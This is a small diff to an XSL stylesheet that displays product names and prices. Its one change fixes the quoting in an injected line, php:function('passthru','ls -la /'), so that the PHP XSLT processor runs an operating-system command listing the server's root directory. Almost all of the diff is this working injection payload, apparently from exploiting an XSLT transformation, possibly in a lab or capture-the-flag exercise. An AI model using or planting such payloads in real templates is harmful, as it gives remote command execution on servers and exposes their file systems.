@@ -5,7 +5,7 @@
   <div style="background-color:black;color:red;padding:4px">
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <xsl:value-of select="price"/>
-<xsl:value-of select="php:function(‘passthru’,’ls -la /’)"/>
+<xsl:value-of select="php:function('passthru','ls -la /')"/>
     </div>
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
     <p>
